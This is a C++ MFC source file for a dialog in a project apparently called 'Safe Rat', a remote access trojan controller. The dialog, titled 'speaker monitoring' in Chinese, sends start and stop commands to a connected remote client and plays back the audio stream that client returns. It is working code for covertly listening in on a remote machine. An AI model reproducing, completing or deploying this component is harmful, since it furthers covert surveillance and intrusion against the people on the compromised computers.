// CSpeakerDlg.cpp: 实现文件
//

#include "pch.h"
#include "Safe Rat.h"
#include "CSpeakerDlg.h"
#include "afxdialogex.h"


// CSpeakerDlg 对话框

IMPLEMENT_DYNAMIC(CSpeakerDlg, CDialogEx)

CSpeakerDlg::CSpeakerDlg(CWnd* pParent, CHpTcpServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(IDD_SPEAKER, pParent)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_SP));;
	m_bOnClose = FALSE;
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_nTotalRecvBytes = 0;
}

CSpeakerDlg::~CSpeakerDlg()
{
}

void CSpeakerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_BUTTON1, m_start);
	DDX_Control(pDX, IDC_BUTTON2, m_m_stop);
}


BEGIN_MESSAGE_MAP(CSpeakerDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON1, &CSpeakerDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CSpeakerDlg::OnBnClickedButton2)
END_MESSAGE_MAP()


// CSpeakerDlg 消息处理程序


BOOL CSpeakerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	//设置标题
	CString str;
	str.Format("%s - 扬声器监听", m_pContext->m_RemoteIP);
	SetWindowText(str);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CSpeakerDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;

	m_nTotalRecvBytes += m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;   //1000+ =1000 1
	CString	strString;
	strString.Format(_T("数据接收 %d KBytes"), m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_STATIC_R, strString);

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SPEAK_DATA:
	{
		SetSpeakerDate.PlayBuffer(m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);   //播放波形数据
		break;
	}
	default:
		// 传输发生异常数据
		break;
	}

}
void CSpeakerDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnClose();

	CDialogEx::PostNcDestroy();
	delete this;
}


void CSpeakerDlg::OnClose()
{
	m_iocpServer->Disconnect(m_pContext);
	m_bOnClose = TRUE;
	CDialogEx::OnClose();
}


void CSpeakerDlg::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	BYTE bToken = COMMAND_SPEAK_START;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	CoInitialize(NULL);
	SetSpeakerDate.Initialize();
	SetSpeakerDate.Start();
}


void CSpeakerDlg::OnBnClickedButton2()
{
	// TODO: 在此添加控件通知处理程序代码
	BYTE bToken = COMMAND_SPEAK_STOP;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	if (SetSpeakerDate.IsRendering())
	{
		SetSpeakerDate.Stop();
		SetSpeakerDate.Destroy();
	}
	CoUninitialize();
}


BOOL CSpeakerDlg::PreTranslateMessage(MSG* pMsg)
{
	if (
		pMsg->message == WM_KEYDOWN		
		&&(	pMsg->wParam == VK_ESCAPE	 
		||	pMsg->wParam == VK_CANCEL	
		||	pMsg->wParam == VK_RETURN	
		))
		return TRUE;

	return CDialogEx::PreTranslateMessage(pMsg);
}
